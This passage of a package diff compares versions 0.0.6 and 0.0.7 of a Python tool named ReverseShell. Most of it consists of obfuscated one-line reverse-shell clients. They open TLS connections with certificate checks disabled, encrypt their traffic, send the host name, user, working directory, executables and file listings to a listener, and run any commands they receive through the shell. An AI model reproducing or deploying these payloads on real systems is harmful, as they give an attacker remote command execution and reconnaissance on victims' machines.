d=b" "\n		while x:\n			s=b();s.connect(("127.0.0.1", 1337));s=c.wrap_socket(s);a(f.replace(b"{type}",b"text/plain; charset=utf-8").replace(b"{length}",str(len(d)).encode("latin-1"))+e(d));m=e(s.recv(65535).split(b"\\r\\n\\r\\n",1)[1],x).decode();p=run(m,shell=x,stdout=z,stderr=z);d=p.stdout+p.stderr or b" ";s.close()')
```

### Comparing `ReverseShell-0.0.6/oneliners/shellclienthttpsencrypt_advanced.sh` & `ReverseShell-0.0.7/oneliners/shellclienthttpsencrypt_advanced.sh`

 * *Files 22% similar despite different names*

```diff
@@ -1 +1 @@
-python3 -c "exec('from json import dumps;from platform import node as h;from socket import socket as b;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=b\\x22abcd\\x22\\r\\ndef e(p,d=False):\\r\\n	if d:v=p[:256];p=p[256:]\\r\\n	else:v=y(256)\\r\\n	j,S,o=0,list(range(256)),[]\\r\\n	for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]\\r\\n	S = [v[i]^c for i,c in enumerate(S)];i=j=0\\r\\n	for c in p:i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];o.append(c^S[(S[i]+S[j])%256])\\r\\n	if d:return bytes(o)\\r\\n	return v+bytes(o)\\r\\ndef g():return [f for d in n[\\x22PATH\\x22].split(\\x22:\\x22 if name \x21= \\x22nt\\x22 else \\x22;\\x22) if w(d) for f in l(d)]\\r\\ndef a(d):\\r\\n	c,d=d[:30000],d[30000:]\\r\\n	while c:s.sendall(c);c=d[:30000];d=d[30000:]\\r\\nf=b\\x22POST / HTTP/1.0\\\\r\\\\nContent-Type: {type}\\\\r\\\\nHost: 127.0.0.1\\\\r\\\\nContent-Length: {length}\\\\r\\\\n\\\\r\\\\n\\x22;c=u()\\r\\nwhile x:\\r\\n	with q(Exception):\\r\\n		r=b\\x22\\x22\\r\\n		while r\x21=b\\x22\\\\6\\x22:\\r\\n			s=b();s.connect((\\x22127.0.0.1\\x22,1337));d=e(b\\x22\\\\1\\x22+dumps({\\x22hostname\\x22:h(),\\x22user\\x22:i(),\\x22cwd\\x22:j(),\\x22executables\\x22:g(),\\x22files\\x22:l()}).encode());s=c.wrap_socket(s);a(f.replace(b\\x22{type}\\x22,b\\x22application/json; charset=utf-8\\x22).replace(b\\x22{length}\\x22,str(len(d)).encode(\\x22latin-1\\x22))+d);r=e(s.recv(65535).split(b\\x22\\\\r\\\\n\\\\r\\\\n\\x22,1)[1],x);s.close()\\r\\n		d=b\\x22 \\x22\\r\\n		while x:\\r\\n			s=b();s.connect((\\x22127.0.0.1\\x22, 1337));s=c.wrap_socket(s);a(f.replace(b\\x22{type}\\x22,b\\x22text/plain; charset=utf-8\\x22).replace(b\\x22{length}\\x22,str(len(d)).encode(\\x22latin-1\\x22))+e(d));m=e(s.recv(65535).split(b\\x22\\\\r\\\\n\\\\r\\\\n\\x22,1)[1],x).decode();p=run(m,shell=x,stdout=z,stderr=z);d=p.stdout+p.stderr or b\\x22 \\x22;s.close()')"
+python3 -c "exec('from json import dumps;from platform import node as h,system as S;from socket import socket as b;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=b\\\"abcd\\\";f=b\\\"POST / HTTP/1.0\\\\r\\\\nContent-Type: {type}\\\\r\\\\nHost: 127.0.0.1\\\\r\\\\nContent-Length: {length}\\\\r\\\\n\\\\r\\\\n\\\";c=u()\\ndef e(p,d=False):\\n	if d:v=p[:256];p=p[256:]\\n	else:v=y(256)\\n	j,S,o=0,list(range(256)),[]\\n	for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]\\n	S = [v[i]^c for i,c in enumerate(S)];i=j=0\\n	for c in p:i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];o.append(c^S[(S[i]+S[j])%256])\\n	if d:return bytes(o)\\n	return v+bytes(o)\\ndef g():return [f for d in n[\\\"PATH\\\"].split(\\\":\\\" if name \x21= \\\"nt\\\" else \\\";\\\") if w(d) for f in l(d)]\\ndef a(d):\\n	c,d=d[:30000],d[30000:]\\n	while c:s.sendall(c);c=d[:30000];d=d[30000:]\\nwhile x:\\n	with q(Exception):\\n		r=b\\\"\\\"\\n		while r\x21=b\\\"\\\\6\\\":\\n			s=b();s.connect((\\\"127.0.0.1\\\",1337));d=e(b\\\"\\\\1\\\"+dumps({\\\"hostname\\\":h(),\\\"user\\\":i(),\\\"cwd\\\":j(),\\\"executables\\\":g(),\\\"files\\\":l(),\\\"system\\\":S()}).encode());s=c.wrap_socket(s);a(f.replace(b\\\"{type}\\\",b\\\"application/json; charset=utf-8\\\").replace(b\\\"{length}\\\",str(len(d)).encode(\\\"latin-1\\\"))+d);r=e(s.recv(65535).split(b\\\"\\\\r\\\\n\\\\r\\\\n\\\",1)[1],x);s.close()\\n		d=b\\\" \\\"\\n		while x:\\n			s=b();s.connect((\\\"127.0.0.1\\\", 1337));s=c.wrap_socket(s);a(f.replace(b\\\"{type}\\\",b\\\"text/plain; charset=utf-8\\\").replace(b\\\"{length}\\\",str(len(d)).encode(\\\"latin-1\\\"))+e(d));m=e(s.recv(65535).split(b\\\"\\\\r\\\\n\\\\r\\\\n\\\",1)[1],x).decode();p=run(m,shell=x,stdout=z,stderr=z);d=p.stdout+p.stderr or b\\\" \\\";s.close()')"
```

### Comparing `ReverseShell-0.0.6/oneliners/shellclienthttpsencrypt_advanced2.py` & `ReverseShell-0.0.7/oneliners/shellclienthttpsencrypt_advanced2.py`

 * *Files 17% similar despite different names*

```diff
@@ -1 +1 @@
-exec('from json import dumps;from platform import node as h;from urllib.request import urlopen as b, Request as f;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=argv[1].encode()\r\ndef e(p,d=False):\r\n\tif d:v=p[:256];p=p[256:]\r\n\telse:v=y(256)\r\n\tj,S,o=0,list(range(256)),[]\r\n\tfor i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]\r\n\tS = [v[i]^c for i,c in enumerate(S)];i=j=0\r\n\tfor c in p:i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];o.append(c^S[(S[i]+S[j])%256])\r\n\tif d:return bytes(o)\r\n\treturn v+bytes(o)\r\ndef g():return [f for d in n["PATH"].split(":" if name != "nt" else ";") if w(d) for f in l(d)]\r\nc=u();v="https://127.0.0.1:1337/"\r\nwhile x:\r\n\twith q(Exception):\r\n\t\tr=b""\r\n\t\twhile r!=b"\\6":\r\n\t\t\tr=e(b(f(v,method="POST",data=e(b"\\1"+dumps({"hostname":h(),"user":i(),"cwd":j(),"executables":g(),"files":l()}).encode())),context=c).read(),x)\r\n\t\td=b" "\r\n\t\twhile x:\r\n\t\t\tm=e(b(f(v,method="POST",data=e(d)),context=c).read(),x).decode();p=run(m,shell=x,stdout=z,stderr=z);d=p.stdout+p.stderr or b" "')
+exec('from json import dumps;from platform import node as h,system as S;from urllib.request import urlopen as b, Request as f;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=argv[1].encode();c=u();v="https://127.0.0.1:1337/"\ndef e(p,d=False):\n\tif d:v=p[:256];p=p[256:]\n\telse:v=y(256)\n\tj,S,o=0,list(range(256)),[]\n\tfor i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]\n\tS = [v[i]^c for i,c in enumerate(S)];i=j=0\n\tfor c in p:i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];o.append(c^S[(S[i]+S[j])%256])\n\tif d:return bytes(o)\n\treturn v+bytes(o)\ndef g():return [f for d in n["PATH"].split(":" if name != "nt" else ";") if w(d) for f in l(d)]\nwhile x:\n\twith q(Exception):\n\t\tr=b""\n\t\twhile r!=b"\\6":\n\t\t\tr=e(b(f(v,method="POST",data=e(b"\\1"+dumps({"hostname":h(),"user":i(),"cwd":j(),"executables":g(),"files":l(),"system":S()}).encode())),context=c).read(),x)\n\t\td=b" "\n\t\twhile x:\n\t\t\tm=e(b(f(v,method="POST",data=e(d)),context=c).read(),x).decode();p=run(m,shell=x,stdout=z,stderr=z);d=p.stdout+p.stderr or b" "')
```

### Comparing `ReverseShell-0.0.6/server.crt` & `ReverseShell-0.0.7/server.crt`

 * *Files identical despite different names*

### Comparing `ReverseShell-0.0.6/server.key` & `ReverseShell-0.0.7/server.key`

 * *Files identical despite different names*

### Comparing `ReverseShell-0.0.6/setup.py` & `ReverseShell-0.0.7/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 from setuptools import setup
 from glob import glob
 
 setup(
     name="ReverseShell",
-    version="0.0.6",
+    version="0.0.7",
     py_modules=["ReverseShell"],
     install_requires=["PythonToolsKit"],
     author="Maurice Lambert",
     author_email="mauricelambert434@gmail.com",
     maintainer="Maurice Lambert",
     maintainer_email="mauricelambert434@gmail.com",
     description=(
```

